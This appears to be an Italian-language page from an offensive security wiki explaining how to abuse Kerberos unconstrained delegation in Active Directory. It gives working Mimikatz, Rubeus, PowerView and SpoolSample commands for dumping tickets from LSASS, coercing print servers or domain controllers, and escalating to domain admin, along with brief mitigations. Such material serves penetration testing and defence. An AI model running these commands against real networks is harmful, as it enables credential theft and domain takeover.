# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Questa è una funzionalità che un Amministratore di Dominio può impostare su qualsiasi **Computer** all'interno del dominio. Quindi, ogni volta che un **utente accede** al Computer, una **copia del TGT** di quell'utente verrà **inviata all'interno del TGS** fornito dal DC **e salvata in memoria in LSASS**. Quindi, se hai privilegi di Amministratore sulla macchina, sarai in grado di **estrarre i ticket e impersonare gli utenti** su qualsiasi macchina.

Quindi, se un amministratore di dominio accede a un Computer con la funzionalità "Unconstrained Delegation" attivata, e tu hai privilegi di amministratore locale su quella macchina, sarai in grado di estrarre il ticket e impersonare l'Amministratore di Dominio ovunque (privilegi di escalation del dominio).

Puoi **trovare oggetti Computer con questo attributo** controllando se l'attributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puoi farlo con un filtro LDAP di ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, che è ciò che fa powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Carica il ticket dell'Amministratore (o dell'utente vittima) in memoria con **Mimikatz** o **Rubeus per un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Ulteriori informazioni: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Ulteriori informazioni sulla delega non vincolata in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forzare l'Autenticazione**

Se un attaccante è in grado di **compromettere un computer autorizzato per "Delega Non Vincolata"**, potrebbe **ingannare** un **server di stampa** per **accedere automaticamente** ad esso **salvando un TGT** nella memoria del server.\
Successivamente, l'attaccante potrebbe eseguire un **attacco Pass the Ticket per impersonare** l'account del computer del server di stampa.

Per far accedere un server di stampa contro qualsiasi macchina puoi usare [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se il TGT proviene da un controller di dominio, puoi eseguire un [**attacco DCSync**](acl-persistence-abuse/index.html#dcsync) e ottenere tutti gli hash dal DC.\
[**Ulteriori informazioni su questo attacco in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Trova qui altri modi per **forzare un'autenticazione:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigazione

- Limitare gli accessi DA/Admin a servizi specifici
- Impostare "L'account è sensibile e non può essere delegato" per gli account privilegiati.

{{#include ../../banners/hacktricks-training.md}}
